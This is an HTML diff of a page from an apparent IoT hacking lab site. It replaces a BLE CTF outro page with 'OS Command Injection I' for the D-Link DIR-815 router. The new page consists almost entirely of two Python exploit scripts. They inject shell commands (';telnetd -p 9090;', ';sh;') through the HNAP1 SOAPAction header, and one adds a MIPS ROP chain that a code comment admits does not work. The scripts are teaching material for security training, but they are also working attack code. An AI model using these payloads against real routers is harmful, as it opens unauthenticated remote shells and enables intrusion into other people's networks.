@@ -5,7 +5,7 @@
 <meta name=generator content="Hugo 0.88.1">
 <meta name=description content>
 <link rel=icon href=/images/favicon.png type=image/png>
-<title>Outro :: IoT Hack Labs</title>
+<title>OS Command Injection I :: IoT Hack Labs</title>
 <link href=/css/nucleus.css?1634615416 rel=stylesheet>
 <link href=/css/fontawesome-all.min.css?1634615416 rel=stylesheet>
 <link href=/css/hybrid.css?1634615416 rel=stylesheet>
@@ -20,7 +20,7 @@
 <script src=/js/jquery-3.3.1.min.js?1634615416></script>
 <style>:root #header+#content>#left>#rlblock_left{display:none!important}</style>
 </head>
-<body data-url=/btle-ctf/99-outro/>
+<body data-url=/router-lab/dir-815/os-command-injection-i/>
 <nav id=sidebar>
 <div id=header-wrapper>
 <div id=header>
@@ -76,7 +76,8 @@ Test Remote Connection
 </li>
 </ul>
 </li>
-<li data-nav-id=/router-lab/ title="Router Lab" class=dd-item>
+<li data-nav-id=/router-lab/ title="Router Lab" class="dd-item
+parent">
 <a href=/router-lab/>
 Router Lab
 </a>
@@ -98,7 +99,8 @@ References
 </li>
 </ul>
 </li>
-<li data-nav-id=/router-lab/dir-815/ title=DIR-815 class=dd-item>
+<li data-nav-id=/router-lab/dir-815/ title=DIR-815 class="dd-item
+parent">
 <a href=/router-lab/dir-815/>
 DIR-815
 </a>
@@ -108,7 +110,7 @@ DIR-815
 Auth Buffer Overflow
 </a>
 </li>
-<li data-nav-id=/router-lab/dir-815/os-command-injection-i/ title="OS Command Injection I" class=dd-item>
+<li data-nav-id=/router-lab/dir-815/os-command-injection-i/ title="OS Command Injection I" class="dd-item active">
 <a href=/router-lab/dir-815/os-command-injection-i/>
 OS Command Injection I
 </a>
@@ -178,8 +180,7 @@ References
 </li>
 </ul>
 </li>
-<li data-nav-id=/btle-ctf/ title="BTLE CTF" class="dd-item
-parent">
+<li data-nav-id=/btle-ctf/ title="BTLE CTF" class=dd-item>
 <a href=/btle-ctf/>
 BTLE CTF
 </a>
@@ -189,7 +190,7 @@ BTLE CTF
 Intro
 </a>
 </li>
-<li data-nav-id=/btle-ctf/99-outro/ title=Outro class="dd-item active">
+<li data-nav-id=/btle-ctf/99-outro/ title=Outro class=dd-item>
 <a href=/btle-ctf/99-outro/>
 Outro
 </a>
@@ -207,7 +208,7 @@ Outro
 <div>
 <div id=top-bar>
 <div id=top-github-link>
-<a class=github-link title="Edit this page" href=https://github.com/Iot-hack-labs/iot-hack-labs.github.io/blob/main/content/BTLE%20CTF/99-outro.md target=blank>
+<a class=github-link title="Edit this page" href=https://github.com/Iot-hack-labs/iot-hack-labs.github.io/blob/main/content/Router%20Lab/DIR-815/OS-Command-Injection-I.md target=blank>
 <i class="fas fa-code-branch"></i>
 <span id=top-github-link-text>Edit this page</span>
 </a>
@@ -220,18 +221,14 @@ Outro
 </span>
 <span id=toc-menu><i class="fas fa-list-alt"></i></span>
 <span class=links>
-<a href=/></a> > <a href=/btle-ctf/>BTLE CTF</a> > Outro
+<a href=/></a> > <a href=/router-lab/>Router Lab</a> > <a href=/router-lab/dir-815/>DIR-815</a> > OS Command Injection I
 </span>
 </div>
 <div class=progress>
 <div class=wrapper>
 <nav id=TableOfContents>
 <ul>
-<li><a href=#finishing-up>Finishing up</a>
-<ul>
-<li><a href=#references>References</a></li>
-</ul>
-</li>
+<li><a href=#os-command-injection-i>OS Command Injection I</a></li>
 </ul>
 </nav>
 </div>
@@ -242,24 +239,45 @@ Outro
 </div>
 <div id=body-inner>
 <h1>
-Outro
+OS Command Injection I
 </h1>
-<h2 id=finishing-up>Finishing up</h2>
-<p>Thats it for this lab. You are welcome to continue to try the other challenges.
-If you are done, reset the CTF by writing <code>0xC1EA12</code> to handle <code>0x0032</code>.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0032 -n C1EA12
-</code></pre></div><h3 id=references>References</h3>
-<ul>
-<li><a href=https://github.com/hackgnar/ble_ctf_infinity>https://github.com/hackgnar/ble_ctf_infinity</a></li>
-<li>Chapter 11 of Practical IoT Hacking from No Starch Press.</li>
-</ul>
+<h2 id=os-command-injection-i>OS Command Injection I</h2>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> socket
+<span style=color:#f92672>import</span> struct
+
+<span style=color:#75715e># CSRF or any other trickery, but probably only works when connected to network I suppose</span>
+
+buf <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;POST /HNAP1/ HTTP/1.0</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>HOST: 99.249.143.124</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>User-Agent: test</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>Content-Length: 1</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>SOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX&#34;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;;telnetd -p 9090;</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;1</span><span style=color:#ae81ff>\r\n\r\n</span><span style=color:#e6db74>&#34;</span>
+
+print <span style=color:#e6db74>&#34;[+] sending buffer size&#34;</span>, len(buf)
+s <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
+s<span style=color:#f92672>.</span>connect((<span style=color:#e6db74>&#34;192.168.0.1&#34;</span>, <span style=color:#ae81ff>80</span>))
+s<span style=color:#f92672>.</span>send(buf)
+</code></pre></div><p>or</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> socket
+<span style=color:#f92672>import</span> struct
+
+
+<span style=color:#75715e># format junk+ROP1(have right value in A0) + ROP2(add or subtract to create right system address) + ROP3(Jump to right address)</span>
+
+buf <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;POST /HNAP1/ HTTP/1.0</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>HOST: 192.168.1.8</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>User-Agent: test</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>Content-Length: 1</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>SOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX&#34;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;;sh;&#34;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34;H&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>286</span>
+buf<span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x40\xF4\xB1\x2A</span><span style=color:#e6db74>&#34;</span> <span style=color:#75715e># (ROP gadget which puts right value in A0)</span>
+buf<span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;B&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>20</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34;ZZZZ&#34;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34;telnetd -p 6778&#34;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34;C&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>5</span> <span style=color:#75715e># adjustment to get to the right payload</span>
+buf<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xA0\xb2\xb4\x2a</span><span style=color:#e6db74>&#34;</span> <span style=color:#75715e># The system address is 2Ab4b200 so changing that in GDB just before jumping to test if it works which it does not</span>
+buf<span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;1</span><span style=color:#ae81ff>\r\n\r\n</span><span style=color:#e6db74>&#34;</span>
+
+print <span style=color:#e6db74>&#34;[+] sending buffer size&#34;</span>, len(buf)
+s <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
+s<span style=color:#f92672>.</span>connect((<span style=color:#e6db74>&#34;1.2.3.4&#34;</span>, <span style=color:#ae81ff>80</span>))
+s<span style=color:#f92672>.</span>send(buf)
+</code></pre></div>
 <footer class=footline>
 </footer>
 </div>
 </div>
 <div id=navigation>
-<a class="nav nav-prev" href=/btle-ctf/01-intro/ title=Intro> <i class="fa fa-chevron-left"></i></a>
-<a class="nav nav-next" href=/btle-ctf/01-intro/ title=Intro style=margin-right:0><i class="fa fa-chevron-right"></i></a>
+<a class="nav nav-prev" href=/router-lab/dir-815/auth-buffer-overflow/ title="Auth Buffer Overflow"> <i class="fa fa-chevron-left"></i></a>
+<a class="nav nav-next" href=/router-lab/dir-815/os-command-injection-ii/ title="OS Command Injection II" style=margin-right:0><i class="fa fa-chevron-right"></i></a>
 </div>
 </section>
 <div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px>
